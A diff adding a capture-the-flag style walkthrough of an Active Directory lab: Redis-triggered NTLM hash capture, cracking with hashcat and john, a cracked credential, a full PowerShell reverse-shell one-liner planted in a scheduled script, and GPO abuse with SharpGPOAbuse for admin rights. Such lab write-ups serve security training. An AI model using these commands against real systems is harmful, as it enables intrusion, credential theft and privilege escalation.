@@ -85,29 +85,116 @@ So if we launch a SMB server with Responder on one hand and force the server to 
 
 we first set up a listener using `Impacket's Responder.py`.
 
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
+# listener.
+sudo responder -i tun0
 
+# request for a fake share.
+redis-cli -h EVAL "dofile('//10.18.88.214/noraj')" 0
+```
+{% endcode %}
 
+<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption><p>1</p></figcaption></figure>
 
+We captured the NTLMv2 hash for "enterprise-security" user account, we can crack it:
 
+Using haiti to detect the hash type:&#x20;
 
+<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption><p>2</p></figcaption></figure>
 
+`hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt` - crackin with hashcat.
 
+`john hash.txt --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt` - cracking with john.
 
+{% hint style="info" %}
+sand\_0873959498 <--> enterprise-security
+{% endhint %}
 
+We have valid credentials now to enumerate SMB.
 
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
+smbclient -L \\\\10.10.117.3\\ -U 'enterprise-security'
+```
+{% endcode %}
 
+<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption><p>3</p></figcaption></figure>
 
+Connecting to the "Enterprise-Share"
 
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
+smbclient \\\\10.10.117.3\\Enterprise-Share -U enterprise-security
+```
+{% endcode %}
 
+<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption><p>4</p></figcaption></figure>
 
+We viewed the .ps1 script file, and see its a scheduled script.
 
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
+┌──(dking㉿dkingws)-[~]
+└─$ cat PurgeIrrelevantData_1826.ps1 
+rm -Force C:\Users\Public\Documents\* -ErrorAction SilentlyContinue
+```
+{% endcode %}
 
+We could replace this with a Powershell Oneliner to get a reverse shell.
 
+{% code overflow="wrap" lineNumbers="true" %}
+```powershell
+$client = New-Object System.Net.Sockets.TCPClient('10.18.88.214',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+{% endcode %}
 
+<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption><p>5</p></figcaption></figure>
 
+And we got a shell.
 
+#### Priv Esc
 
+We have "SeImpersonatePrivilege", so we could use Potatoe attack or use BloodHound to find another path.
 
+<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption><p>6</p></figcaption></figure>
 
+I used Metasploit and got "Nt Authority".
 
+#### 2nd Method for Priv Esc:
 
+After gaining initial access using the Powershell script, we can use "SharpHound.exe" to gather Domain info, then feed the data to BloodHound to give us shortest path to Admin or Domain Admin.
+
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
+.\SharpHound.exe -c All
+```
+{% endcode %}
+
+<figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption><p>7</p></figcaption></figure>
+
+&#x20;We can use BloodHound to analyse the found data: Immediately, BloodHound gives us the shortest path from our current user `enterprise-security` to the `Administrator`. Apparently, we do have `GenericWrite` Permissions to one of the `GPO`s - namely `security-pol-vn`.
+
+Copy the .zip file to the Share folder, then download to kali for use in BloodHound.
+
+`powershell cp .\20230907143943_BloodHound.zip C:\Enterprise-Share\20230907143943_BloodHound.zip` .
+
+We can use the [SharpGPOAbuse.exe](https://github.com/byronkg/SharpGPOAbuse/tree/main/SharpGPOAbuse-master) binary to exploit the "GenericWrite" permission on that GPO object.
+
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
+.\SharpGPOAbuse.exe --AddComputerTask --TaskName "privesc" --Author vulnnet\administrator --Command "cmd.exe" --Arguments "/c net localgroup administrators enterprise-security /add" --GPOName "SECURITY-POL-VN"
+```
+{% endcode %}
+
+<figure><img src=".gitbook/assets/image (8).png" alt=""><figcaption><p>8</p></figcaption></figure>
+
+We can do a `gpupdate /force` - to force update the settings, then when we do a `net users enterprise-security` - we should be added to the Administrator groups now.
+
+<figure><img src=".gitbook/assets/image (9).png" alt=""><figcaption><p>9</p></figcaption></figure>
+
+Note we are not able to go into the Administrator folder from the shell, but we can access the Administrator folder via the SMB share.
+
+`smbclient \\10.10.92.208\C$ -U enterprise-security` .
+
+DONE !
